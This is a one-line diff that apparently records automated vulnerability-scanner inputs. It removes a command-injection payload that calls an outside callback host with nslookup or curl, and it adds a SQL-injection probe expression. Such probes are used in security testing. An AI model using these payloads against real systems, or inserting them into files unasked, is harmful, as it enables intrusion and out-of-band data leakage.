@@ -1,1 +1,1 @@
-(nslookup -q=cname hitucidijvycd8da96.bxss.me||curl hitucidijvycd8da96.bxss.me))
+-1 OR 3*2<(0+5+683-683)
